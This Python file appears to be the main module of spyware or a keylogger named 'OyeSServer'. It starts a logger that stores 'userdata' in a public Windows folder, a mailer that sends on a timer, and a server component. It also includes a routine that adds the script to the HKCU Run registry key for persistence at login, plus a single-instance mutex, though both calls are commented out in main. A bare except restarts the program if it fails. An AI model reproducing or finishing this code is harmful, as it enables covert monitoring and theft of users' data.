from oyesserver import Server
from oyeslogger import Logger
from oyesmailer import Mailer
import win32event
import win32api
import winerror
import os.path
from winreg import *


class OyeSServer:

    # Defines the component instances
    logger = None
    mailer = None
    server = None

    def main(self):
        # self.handle_mul_instances()
        # self.add_startup()
        self.logger = Logger("C:\\Users\\Public\\", "userdata")
        self.mailer = Mailer(self, freq=20)
        self.server = Server(self)

    # TODO: Fix this functionality
    @staticmethod
    def handle_mul_instances():
        mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            mutex = None
            exit(0)

    # TODO: Fix this functionality
    @staticmethod
    def add_startup():
        f = os.path.dirname(os.path.realpath(__file__))
        new_file_path = f + "\\" + "OYE_S_SERVER.py"
        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, "OYE_S_SERVER", 0, REG_SZ, new_file_path)


if __name__ == '__main__':
    try:
        server = OyeSServer()
        server.main()
    except:
        server = OyeSServer()
        server.main()
